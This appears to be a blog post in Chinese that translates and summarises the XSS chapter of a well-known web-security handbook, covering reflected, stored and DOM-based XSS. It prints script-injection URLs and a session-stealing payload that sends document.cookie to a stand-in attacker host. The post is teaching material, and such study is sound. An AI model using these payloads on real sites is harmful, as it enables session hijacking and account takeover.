---
layout:     post
title:      Chapter 12 Attacking Users: Cross-Site Scripting(1) - Varieties of XSS
subtitle:   各种XSS
date:       2020-03-17
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 12

XSS漏洞有多种形式，可以分为三种：反射，存储和基于DOM。 尽管它们具有几个共同点，但在识别和利用它们的方式上也有重要区别。 我们将依次检查各种XSS。

# 1. 反射型XSS漏洞(Reflected XSS Vulnerabilities)

当应用程序使用动态页面向用户显示错误消息时，就会出现XSS的一个非常常见的示例。 通常，页面会使用包含消息文本的参数，并在响应内将文本简单地呈现给用户。 这种类型的机制对开发人员来说很方便，因为它允许开发人员从应用程序中的任何地方调用自定义的错误页面，而无需在错误页面本身中对各个消息进行硬编码。

例如，考虑以下URL，该URL返回图12-1所示的错误消息：
```
http://mdsec.net/error/5/Error.ashx?message=Sorry%2c+an+error+occurred
```

![figure12-1](/img/web_hacking/twahh/figure12-1.jpg)

查看返回页面的HTML源代码，我们可以看到应用程序只是将message参数的值复制到URL中，然后将其插入错误页面模板中的适当位置：
```
<p>Sorry, an error occurred.</p>
```
采取用户提供的输入并将其插入到服务器响应的HTML中的这种行为是所反映的XSS漏洞的特征之一，并且，如果不执行过滤或清理操作，则该应用程序肯定很容易受到攻击。 让我们看看如何。

精心设计了以下URL，以用一段生成弹出对话框的JavaScript替换错误消息：
```
http://mdsec.net/error/5/Error.ashx?message=<script>alert(1)</script>
```
请求此URL将生成一个HTML页面，其中包含以下内容代替原始消息：
```
<p><script>alert(1);</script></p>
```
果然，在用户浏览器中呈现页面后，将显示弹出消息，如图12-2所示。

![figure12-2](/img/web_hacking/twahh/figure12-2.jpg)

执行此简单测试可验证两件重要的事情。 首先，可以用返回到浏览器的任意数据替换message参数的内容。 其次，无论服务器端应用程序对该数据（如果有）执行任何处理，都无法阻止我们提供在浏览器中显示页面时执行的JavaScript代码。

**NOTE**<br>
如果您在Internet Explorer中尝试这样的示例，则弹出窗口可能无法显示，并且浏览器可能会显示消息" Internet Explorer修改了此页面以帮助防止跨站点脚本编写。" 这是因为Internet Explorer的最新版本包含一种内置机制，旨在保护用户免受反射的XSS漏洞的侵害。 如果要测试这些示例，可以尝试使用不使用此保护的其他浏览器，或者可以通过转到工具ÿInternet选项ÿ安全性ÿ自定义级别来禁用XSS筛选器。 在"启用XSS过滤器"下，选择"禁用"。 在本章的后面，我们将描述XSS过滤器的工作方式，以及如何规避它。

这种简单的XSS错误大约占现实Web应用程序中存在的XSS漏洞的75％。 之所以称为反射XSS，是因为利用此漏洞涉及制作包含嵌入式JavaScript的请求，该请求将反映给提出请求的任何用户。 攻击有效负载是通过单个请求和响应来传递和执行的。 因此，有时也称为一阶XSS。

# 1.1 利用漏洞(Exploiting the Vulnerability)

正如您将看到的，可以通过多种不同方式利用XSS漏洞来攻击应用程序的其他用户。 一种最简单的攻击，也是最常见的一种解释XSS漏洞潜在意义的攻击，它导致攻击者捕获经过身份验证的用户的会话令牌。 劫持用户的会话可以使攻击者访问已授权用户的所有数据和功能（请参阅第7章）。

![figure12-3](/img/web_hacking/twahh/figure12-3.jpg)

1.用户正常登录到应用程序，并获得包含会话令牌的cookie：
```
Set-Cookie: sessId=184a9138ed37374201a4c9672362f12459c2a652491a3
```
2.攻击者通过某种方式（稍后将详细介绍）将以下URL馈给用户：
```
http://mdsec.net/error/5/Error.ashx?message=<script>var+i=new+Image
;+i.src="http://mdattacker.net/"%2bdocument.cookie;</script>
```
与上一个生成对话框消息的示例一样，该URL包含嵌入式JavaScript。 但是，这种情况下的攻击有效载荷更具恶意性。<br>

3.用户从应用程序请求攻击者提供给他的URL。<br>

4.服务器响应用户的请求。 由于XSS漏洞，响应包含攻击者创建的JavaScript。

5.用户的浏览器会接收攻击者的JavaScript并执行它的方式，就像执行从应用程序接收到的其他任何代码一样。

6.攻击者创建的恶意JavaScript是：
```
var i=new Image; i.src="http://mdattacker.net/"+document.cookie;
```
此代码使用户的浏览器向攻击者拥有的域mdattacker.net发出请求。 该请求包含用户当前应用程序的会话令牌：
```
GET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
Host: mdattacker.net
```
7.攻击者监视对mdattacker.net的请求并接收用户的请求。 他使用捕获的令牌劫持用户的会话，获得对该用户的个人信息的访问权，并以"用户"身份执行任意操作。

**NOTE**<br>
如您在第6章中所看到的，一些应用程序存储一个持久性cookie，该cookie每次访问时都会有效地重新验证用户身份，例如实现"记住我"功能。 在这种情况下，前面的过程的步骤1是不必要的。 即使目标用户未主动登录或使用该应用程序，攻击也会成功。 因此，以这种方式使用Cookie的应用程序会因其所包含的任何XSS缺陷的影响而更加暴露自己。

阅读完所有这些内容后，您可能会想知道为什么，如果攻击者可以诱使用户访问他选择的URL，他会为通过易受攻击的应用程序中的XSS bug传输恶意JavaScript的繁琐程序而烦恼。 他为什么不简单地在mdattacker.net上托管一个恶意脚本，并向用户提供该脚本的直接链接？ 该脚本的执行方式是否与上述示例相同？

要了解为什么攻击者需要利用XSS漏洞，请回顾第3章中描述的同源策略。浏览器将从不同来源（域）接收到的内容进行隔离，以试图防止不同域在内部相互干扰 用户的浏览器。 攻击者的目标不仅是执行任意脚本，还在于捕获用户的会话令牌。 浏览器不允许任何旧脚本访问域的cookie； 否则，会话劫持将很容易。 而是，cookie只能由发布它们的域访问。 它们仅通过HTTP请求提交回发行域，并且只能通过该域返回的页面中包含的JavaScript或由页面加载的JavaScript进行访问。 因此，如果驻留在mdattacker.net上的脚本查询document.cookie，它将无法获取mdsec.net发出的cookie，并且劫持攻击将失败。

利用XSS漏洞的攻击成功的原因在于，就用户的浏览器而言，攻击者的恶意JavaScript是由mdsec.net发送给它的。 当用户请求攻击者的URL时，浏览器将请求http://mdsec.net/error/5/Error.ashx，应用程序将返回一个包含一些JavaScript的页面。 与从mdsec.net接收到的任何JavaScript一样，浏览器会在用户与mdsec.net的关系的安全上下文中执行此脚本。 这就是为什么攻击者的脚本尽管实际上起源于其他地方，但却可以访问mdsec.net发出的cookie的原因。 这也是为什么漏洞本身已被称为跨站点脚本的原因。

# 2. 存储型XSS漏洞(Stored XSS Vulnerabilities)

XSS漏洞的另一类通常称为存储的跨站点脚本。 当一个用户提交的数据存储在应用程序中（通常存储在后端数据库中）然后显示给其他用户而不经过适当的过滤或清理时，就会出现此版本。

存储的XSS漏洞在支持最终用户之间的交互的应用程序中，或者在管理人员访问同一应用程序内的用户记录和数据的应用程序中很常见。 例如，考虑一个拍卖应用程序，该应用程序允许买家发布有关特定商品的问题，并允许卖家发布回复。 如果用户可以发布包含嵌入式JavaScript的问题，而应用程序未对此进行过滤或清理，则攻击者可以发布精心设计的问题，该问题导致任意查看该问题的人（包括卖方和卖方）在浏览器中执行任意脚本。 其他潜在买家。 在这种情况下，攻击者可能会导致不知情的用户对某物品进行竞标而无意，或者使卖方关闭拍卖并接受攻击者对该物品的低价。

针对存储的XSS漏洞的攻击通常涉及至少两个对应用程序的请求。 首先，攻击者发布了一些包含应用程序存储的恶意代码的精心制作的数据。 第二种方法是，受害者查看包含攻击者数据的页面，并在受害者的浏览器中执行脚本时执行恶意代码。 因此，该漏洞有时也称为二阶跨站点脚本。 （在这种情况下，" XSS"实际上是用词不当，因为攻击没有跨站元素。但是，该名称被广泛使用，因此我们将其保留在此处。）

图12-4说明了攻击者如何利用存储的XSS漏洞执行与针对反射XSS所述的相同会话劫持攻击。

![figure12-4](/img/web_hacking/twahh/figure12-4.jpg)

反映和存储的XSS在攻击过程中有两个重要区别。 从安全角度来看，存储的XSS通常更为严重。

首先，在使用反射的XSS的情况下，为了利用漏洞，攻击者必须诱使受害者访问其精心制作的URL。 在存储XSS的情况下，可以避免此要求。 在应用程序中部署了攻击之后，攻击者只需要等待受害者浏览到已被破坏的页面或功能。 通常，这是普通用户自行访问的应用程序常规页面。

其次，如果受害者在攻击时正在使用该应用程序，则通常更容易实现攻击者利用XSS错误的目标。 例如，如果用户已有会话，则可以立即劫持该会话。 在反射的XSS攻击中，攻击者可能会说服用户登录，然后单击他提供的链接来尝试解决这种情况。 或者，他可以尝试部署持久的有效负载，直到用户登录为止。但是，在存储的XSS攻击中，通常可以保证在攻击发生时受害者用户已经在访问应用程序。 因为攻击有效负载存储在用户自行访问的应用程序页面中，根据定义，攻击的任何受害者将在有效负载执行时使用该应用程序。 此外，如果相关页面在应用程序的身份验证区域内，则任何攻击的受害者也必须同时登录。

反映的XSS与存储的XSS之间的这些差异意味着，存储的XSS漏洞通常对于应用程序的安全性至关重要。 在大多数情况下，攻击者可以向应用程序提交一些经精心设计的数据，然后等待受害者受到攻击。 如果这些受害者之一是管理员，则攻击者将破坏整个应用程序。

# 3. 基于DOM的XSS漏洞(DOM-Based XSS Vulnerabilities)

反映的XSS和存储的XSS漏洞均涉及特定的行为模式，在该模式中，应用程序获取用户可控制的数据并将其以不安全的方式显示给用户。 XSS漏洞的第三类不具有此特征。 在这里，攻击者的JavaScript执行过程如下：
- 用户请求攻击者提供的包含嵌入的JavaScript的特制URL。
- 服务器的响应不包含任何形式的攻击者的脚本。
- 当用户的浏览器处理此响应时，脚本仍会执行。

这一系列事件如何发生？ 答案是，客户端JavaScript可以访问浏览器的文档对象模型（DOM），因此可以确定用于加载当前页面的URL。 由应用程序发出的脚本可以从URL中提取数据，对该数据进行一些处理，然后使用它来动态更新页面的内容。 当应用程序执行此操作时，它可能容易受到基于DOM的XSS的攻击。

回想一下原始XSS flaw的示例，其中服务器端应用程序将数据从URL参数复制到错误消息中。 实现相同功能的另一种方式是，应用程序每次都返回相同的静态HTML，并使用客户端JavaScript动态生成消息的内容。

例如，假设应用程序返回的错误页面包含以下内容：
```
<script>
	var url = document.location;
	url = unescape(url);
	var message = url.substring(url.indexOf('message=') + 8, url.length);
	document.write(message);
</script>
```
该脚本解析URL以提取message参数的值，然后将该值简单地写入页面的HTML源代码中。 当按开发人员的意图调用时，可以按与原始示例相同的方式使用它，以轻松创建错误消息。 但是，如果攻击者设计了包含以下内容的网址
JavaScript代码作为message参数的值，该代码将被动态写入页面并以与服务器返回它相同的方式执行。 在此示例中，利用原始反映的XSS漏洞的URL也可以用于生成对话框：
```
http://mdsec.net/error/18/Error.ashx?message=<script>alert('xss')</script>
```
图12-5说明了利用基于DOM的XSS漏洞的过程。

![figure12-5](/img/web_hacking/twahh/figure12-5.jpg)

基于DOM的XSS漏洞与反射的XSS错误相比，与存储的XSS错误更相似。 他们的利用通常涉及攻击者诱使用户访问包含恶意代码的特制URL。 服务器对该特定请求的响应将导致执行恶意代码。 但是，就开发细节而言，反射的和基于DOM的XSS之间存在重要的区别，我们将在稍后进行检查。


[Chapter 11 Attacking Application Logic(3)-Avoiding Logic Flaws](https://dm116.github.io/2020/03/17/attacking-application-logic_3/)<br>
[Chapter 12 Attacking Users: Cross-Site Scripting(2) - XSS Attacks in Action](https://dm116.github.io/2020/03/17/attacking-users-cross-site-scripting_2/)<br>
